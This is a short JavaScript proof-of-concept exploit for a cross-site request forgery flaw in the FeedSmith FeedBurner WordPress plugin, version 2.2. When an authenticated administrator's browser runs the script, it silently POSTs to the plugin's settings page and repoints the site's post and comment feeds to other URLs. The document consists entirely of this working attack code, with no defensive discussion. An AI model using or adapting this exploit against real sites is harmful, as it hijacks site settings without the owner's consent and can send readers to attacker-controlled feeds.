// Simple Proof of Concept Exploit for FeedSmith Feedburner CSRF Hijacking
// Tested on version 2.2.

t=&#039;http://www.example.com/wordpress/wp-admin/options-general.php?
    page=FeedBurner_FeedSmith_Plugin.php&#039;;

p=&#039;redirect=true&amp;feedburner_url=http://www.example2.com/with/new/feed&amp;
    feedburner_comments_url=http://www.example3.com/with/new/feed&#039;;

feedburner_csrf = function(t, p) {

        req = new XMLHttpRequest();
        var url = t;
        var params = p;
        req.open(&quot;POST&quot;, url);

        req.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
        req.setRequestHeader(&quot;Content-length&quot;, params.length);
        req.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;);
        req.send(params);

};

feedburner_csrf(t,p);
